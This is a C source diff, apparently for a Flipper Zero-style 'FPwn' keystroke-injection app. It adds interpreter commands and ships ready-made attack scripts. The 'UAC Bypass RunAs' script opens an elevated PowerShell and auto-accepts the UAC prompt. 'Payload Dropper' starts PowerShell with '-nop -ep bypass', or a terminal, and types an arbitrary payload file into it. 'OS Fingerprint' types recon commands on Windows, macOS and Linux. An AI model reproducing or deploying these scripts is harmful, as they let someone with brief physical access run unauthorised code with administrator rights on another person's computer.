@@ -796,6 +796,218 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- HOLD <key> — hold a key pressed until RELEASE ---- */
+    if(strncmp(line, "HOLD ", 5) == 0) {
+        const char* key_name = line + 5;
+        /* Check for modifier names first */
+        if(strcmp(key_name, "CTRL") == 0 || strcmp(key_name, "CONTROL") == 0) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL);
+        } else if(strcmp(key_name, "ALT") == 0) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT);
+        } else if(strcmp(key_name, "SHIFT") == 0) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT);
+        } else if(
+            strcmp(key_name, "GUI") == 0 || strcmp(key_name, "WINDOWS") == 0 ||
+            strcmp(key_name, "COMMAND") == 0) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI);
+        } else {
+            uint16_t kc = fpwn_named_key(key_name);
+            if(kc) furi_hal_hid_kb_press(kc);
+        }
+        return;
+    }
+
+    /* ---- RELEASE <key> — release a held key ---- */
+    if(strncmp(line, "RELEASE ", 8) == 0) {
+        const char* key_name = line + 8;
+        if(strcmp(key_name, "CTRL") == 0 || strcmp(key_name, "CONTROL") == 0) {
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL);
+        } else if(strcmp(key_name, "ALT") == 0) {
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT);
+        } else if(strcmp(key_name, "SHIFT") == 0) {
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT);
+        } else if(
+            strcmp(key_name, "GUI") == 0 || strcmp(key_name, "WINDOWS") == 0 ||
+            strcmp(key_name, "COMMAND") == 0) {
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI);
+        } else if(strcmp(key_name, "ALL") == 0) {
+            furi_hal_hid_kb_release_all();
+        } else {
+            uint16_t kc = fpwn_named_key(key_name);
+            if(kc) furi_hal_hid_kb_release(kc);
+        }
+        return;
+    }
+    /* RELEASE alone (no argument) — release all keys */
+    if(strcmp(line, "RELEASE") == 0) {
+        furi_hal_hid_kb_release_all();
+        return;
+    }
+
+    /* ---- WAIT_FOR_CAPS_ON — wait until host CapsLock LED is on ---- */
+    if(strcmp(line, "WAIT_FOR_CAPS_ON") == 0) {
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            { strncpy(m->status, "[Wait: CapsLock ON]", sizeof(m->status) - 1); },
+            true);
+        uint32_t start = furi_get_tick();
+        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
+            if(furi_hal_hid_get_led_state() & HID_KB_LED_CAPS) break;
+            furi_delay_ms(20);
+        }
+        return;
+    }
+    if(strcmp(line, "WAIT_FOR_CAPS_OFF") == 0) {
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            { strncpy(m->status, "[Wait: CapsLock OFF]", sizeof(m->status) - 1); },
+            true);
+        uint32_t start = furi_get_tick();
+        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
+            if(!(furi_hal_hid_get_led_state() & HID_KB_LED_CAPS)) break;
+            furi_delay_ms(20);
+        }
+        return;
+    }
+    if(strcmp(line, "WAIT_FOR_NUM_ON") == 0) {
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            { strncpy(m->status, "[Wait: NumLock ON]", sizeof(m->status) - 1); },
+            true);
+        uint32_t start = furi_get_tick();
+        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
+            if(furi_hal_hid_get_led_state() & HID_KB_LED_NUM) break;
+            furi_delay_ms(20);
+        }
+        return;
+    }
+    if(strcmp(line, "WAIT_FOR_NUM_OFF") == 0) {
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            { strncpy(m->status, "[Wait: NumLock OFF]", sizeof(m->status) - 1); },
+            true);
+        uint32_t start = furi_get_tick();
+        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
+            if(!(furi_hal_hid_get_led_state() & HID_KB_LED_NUM)) break;
+            furi_delay_ms(20);
+        }
+        return;
+    }
+
+    /* ---- RANDOM_STRING <length> — type random alphanumeric chars ---- */
+    if(strncmp(line, "RANDOM_STRING ", 14) == 0) {
+        int len = atoi(line + 14);
+        if(len < 1) len = 1;
+        if(len > 64) len = 64;
+        static const char charset[] =
+            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        for(int i = 0; i < len; i++) {
+            uint32_t rnd = furi_hal_random_get();
+            char c = charset[rnd % (sizeof(charset) - 1)];
+            fpwn_type_char(c);
+        }
+        return;
+    }
+
+    /* ---- RANDOM_INT <min> <max> — type a random integer ---- */
+    if(strncmp(line, "RANDOM_INT ", 11) == 0) {
+        const char* rest = line + 11;
+        const char* space = strchr(rest, ' ');
+        if(space) {
+            int32_t min_val = (int32_t)atoi(rest);
+            int32_t max_val = (int32_t)atoi(space + 1);
+            if(max_val >= min_val) {
+                uint32_t range = (uint32_t)(max_val - min_val);
+                uint32_t rnd = furi_hal_random_get();
+                int32_t val = min_val + (int32_t)(rnd % (range + 1));
+                char buf[16];
+                snprintf(buf, sizeof(buf), "%ld", (long)val);
+                fpwn_type_string(buf);
+            }
+        }
+        return;
+    }
+
+    /* ---- ALTCODE <code> — type a character via Windows ALT+numpad code ---- */
+    if(strncmp(line, "ALTCODE ", 8) == 0) {
+        int code = atoi(line + 8);
+        if(code > 0 && code <= 255) {
+            /* Hold ALT, type digits on numpad, release ALT */
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT);
+            furi_delay_ms(20);
+            char digits[8];
+            snprintf(digits, sizeof(digits), "%d", code);
+            static const uint16_t numpad_keys[] = {
+                HID_KEYPAD_0,
+                HID_KEYPAD_1,
+                HID_KEYPAD_2,
+                HID_KEYPAD_3,
+                HID_KEYPAD_4,
+                HID_KEYPAD_5,
+                HID_KEYPAD_6,
+                HID_KEYPAD_7,
+                HID_KEYPAD_8,
+                HID_KEYPAD_9,
+            };
+            for(const char* d = digits; *d; d++) {
+                if(*d >= '0' && *d <= '9') {
+                    uint16_t kc = numpad_keys[*d - '0'];
+                    furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | kc);
+                    furi_delay_ms(10);
+                    furi_hal_hid_kb_release(kc);
+                    furi_delay_ms(10);
+                }
+            }
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT);
+        }
+        return;
+    }
+
+    /* ---- SYSRQ <key> — Linux Magic SysRq Key combo ---- */
+    if(strncmp(line, "SYSRQ ", 6) == 0) {
+        uint16_t kc = fpwn_named_key(line + 6);
+        if(kc) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | HID_KEYBOARD_PRINT_SCREEN);
+            furi_delay_ms(50);
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | HID_KEYBOARD_PRINT_SCREEN | kc);
+            furi_delay_ms(50);
+            furi_hal_hid_kb_release_all();
+        }
+        return;
+    }
+
+    /* ---- TYPE_FILE <filename> — type contents of SD card file as keystrokes ---- */
+    if(strncmp(line, "TYPE_FILE ", 10) == 0) {
+        const char* fname = line + 10;
+        char fpath[FPWN_PATH_LEN];
+        /* If path starts with / it's absolute; otherwise relative to modules dir */
+        if(fname[0] == '/') {
+            strncpy(fpath, fname, sizeof(fpath) - 1);
+        } else {
+            snprintf(fpath, sizeof(fpath), "%s/%s", FPWN_MODULES_DIR, fname);
+        }
+        fpath[sizeof(fpath) - 1] = '\0';
+        File* tf = storage_file_alloc(app->storage);
+        if(storage_file_open(tf, fpath, FSAM_READ, FSOM_OPEN_EXISTING)) {
+            char tbuf[64];
+            uint16_t bread;
+            while((bread = storage_file_read(tf, tbuf, sizeof(tbuf) - 1)) > 0) {
+                tbuf[bread] = '\0';
+                fpwn_type_string(tbuf);
+                if(app->abort_requested) break;
+            }
+            storage_file_close(tf);
+        } else {
+            FURI_LOG_W(TAG, "TYPE_FILE: cannot open %s", fpath);
+        }
+        storage_file_free(tf);
+        return;
+    }
+
     /* ---- SAVE_WIFI — save all WiFi results to SD card from a script ---- */
     if(strcmp(line, "SAVE_WIFI") == 0) {
         if(!app->marauder) {
@@ -2759,6 +2971,158 @@ static const char SAMPLE_WIFI_RECON_FULL[] =
     "WIFI_STA_RESULT\n"
     "END_IF\n";
 
+static const char SAMPLE_UAC_BYPASS[] =
+    "NAME UAC Bypass RunAs\n"
+    "DESCRIPTION Bypasses UAC via RunAs with HOLD/RELEASE key technique\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN\n"
+    "OPTION COMMAND calc.exe \"Command to execute as admin\"\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR YELLOW\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell\n"
+    "REM Hold CTRL+SHIFT and press ENTER for 'Run as Administrator'\n"
+    "HOLD CTRL\n"
+    "HOLD SHIFT\n"
+    "ENTER\n"
+    "RELEASE SHIFT\n"
+    "RELEASE CTRL\n"
+    "DELAY 2000\n"
+    "REM Accept UAC prompt with ALT+Y\n"
+    "ALT y\n"
+    "DELAY 1500\n"
+    "LED_COLOR GREEN\n"
+    "STRINGLN {{COMMAND}}\n"
+    "DELAY 500\n"
+    "STRING exit\n"
+    "ENTER\n";
+
+static const char SAMPLE_OS_FINGERPRINT[] =
+    "NAME OS Fingerprint Script\n"
+    "DESCRIPTION Detects host OS via CapsLock timing and runs appropriate recon\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR BLUE\n"
+    "REM Toggle CapsLock and check response timing\n"
+    "CAPSLOCK\n"
+    "WAIT_FOR_CAPS_ON\n"
+    "LED_COLOR GREEN\n"
+    "REM CapsLock responded - host is alive\n"
+    "CAPSLOCK\n"
+    "WAIT_FOR_CAPS_OFF\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING cmd /k echo HOST:%COMPUTERNAME% USER:%USERNAME% OS:Windows && ver\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR BLUE\n"
+    "CAPSLOCK\n"
+    "WAIT_FOR_CAPS_ON\n"
+    "LED_COLOR GREEN\n"
+    "CAPSLOCK\n"
+    "WAIT_FOR_CAPS_OFF\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRINGLN echo HOST:$(hostname) USER:$(whoami) OS:macOS && sw_vers\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR BLUE\n"
+    "CAPSLOCK\n"
+    "WAIT_FOR_CAPS_ON\n"
+    "LED_COLOR GREEN\n"
+    "CAPSLOCK\n"
+    "WAIT_FOR_CAPS_OFF\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRINGLN echo HOST:$(hostname) USER:$(whoami) OS:Linux && uname -a\n";
+
+static const char SAMPLE_RANDOM_PASSWD[] =
+    "NAME Random Password Gen\n"
+    "DESCRIPTION Types a batch of random passwords into any text field\n"
+    "CATEGORY post\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION COUNT 5 \"Number of passwords to generate\"\n"
+    "OPTION LENGTH 16 \"Password length\"\n"
+    "OPTION DELAY 500 \"Initial delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR CYAN\n"
+    "REPEAT_BLOCK {{COUNT}}\n"
+    "STRING Password: \n"
+    "RANDOM_STRING {{LENGTH}}\n"
+    "ENTER\n"
+    "DELAY 100\n"
+    "END_REPEAT\n"
+    "LED_COLOR GREEN\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR CYAN\n"
+    "REPEAT_BLOCK {{COUNT}}\n"
+    "STRING Password: \n"
+    "RANDOM_STRING {{LENGTH}}\n"
+    "ENTER\n"
+    "DELAY 100\n"
+    "END_REPEAT\n"
+    "LED_COLOR GREEN\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR CYAN\n"
+    "REPEAT_BLOCK {{COUNT}}\n"
+    "STRING Password: \n"
+    "RANDOM_STRING {{LENGTH}}\n"
+    "ENTER\n"
+    "DELAY 100\n"
+    "END_REPEAT\n"
+    "LED_COLOR GREEN\n";
+
+static const char SAMPLE_PAYLOAD_DROPPER[] =
+    "NAME Payload Dropper\n"
+    "DESCRIPTION Types payload file contents from SD card into a terminal\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION PAYLOAD payload.txt \"Filename in modules dir to type\"\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "LED_COLOR YELLOW\n"
+    "TYPE_FILE {{PAYLOAD}}\n"
+    "ENTER\n"
+    "LED_COLOR GREEN\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "LED_COLOR YELLOW\n"
+    "TYPE_FILE {{PAYLOAD}}\n"
+    "ENTER\n"
+    "LED_COLOR GREEN\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "LED_COLOR YELLOW\n"
+    "TYPE_FILE {{PAYLOAD}}\n"
+    "ENTER\n"
+    "LED_COLOR GREEN\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -2835,4 +3199,16 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/wifi_recon_full.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_RECON_FULL);
+
+    snprintf(path, sizeof(path), "%s/uac_bypass.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_UAC_BYPASS);
+
+    snprintf(path, sizeof(path), "%s/os_fingerprint.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_OS_FINGERPRINT);
+
+    snprintf(path, sizeof(path), "%s/random_passwd.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_RANDOM_PASSWD);
+
+    snprintf(path, sizeof(path), "%s/payload_dropper.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_PAYLOAD_DROPPER);
 }
